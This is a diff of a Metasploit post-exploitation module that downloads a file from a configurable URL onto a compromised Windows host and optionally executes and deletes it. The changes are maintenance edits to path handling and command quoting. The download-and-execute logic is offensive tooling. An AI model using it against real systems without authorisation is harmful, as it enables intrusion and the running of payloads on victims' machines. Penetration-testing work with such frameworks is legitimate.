@@ -1,19 +1,14 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'rex'
-require 'msf/core/post/file'
-require 'msf/core/post/common'
 
 class Metasploit3 < Msf::Post
 
   include Msf::Post::File
-  include Msf::Post::Common
 
   def initialize(info={})
     super(update_info(info,
@@ -40,7 +35,7 @@ class Metasploit3 < Msf::Post
     register_advanced_options(
       [
         OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
-        OptInt.new('EXEC_TIMEOUT',     [true, 'Execution timeout', 60 ]),
+        OptInt.new(   'EXEC_TIMEOUT',  [true, 'Execution timeout', 60 ]),
         OptBool.new(  'DELETE',        [true, 'Delete file after execution', false ]),
       ], self.class)
 
@@ -81,16 +76,16 @@ class Metasploit3 < Msf::Post
     url = datastore["URL"]
     filename = datastore["FILENAME"] || url.split('/').last
 
-    download_path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"])
-    if download_path.nil? or download_path.empty?
-      path = session.fs.file.expand_path("%TEMP%")
+    path = datastore['DOWNLOAD_PATH']
+    if path.blank?
+      path = session.sys.config.getenv('TEMP')
     else
-      path = download_path
+      path = session.fs.file.expand_path(path)
     end
 
     outpath = path + '\\' + filename
     exec = datastore['EXECUTE']
-    exec_string = datastore['EXEC_STRING'] || ''
+    exec_string = datastore['EXEC_STRING']
     output = datastore['OUTPUT']
     remove = datastore['DELETE']
 
@@ -113,11 +108,7 @@ class Metasploit3 < Msf::Post
     # Execute file upon request
     if exec
       begin
-        cmd = "#{outpath} #{exec_string}"
-
-        # If we don't have the following gsub, we get this error in Windows:
-        # "Operation failed: The system cannot find the file specified"
-        cmd = cmd.gsub(/\\/, '\\\\\\').gsub(/\s/, '\ ')
+        cmd = "\"#{outpath}\" #{exec_string}"
 
         print_status("Executing file: #{cmd}")
         res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])
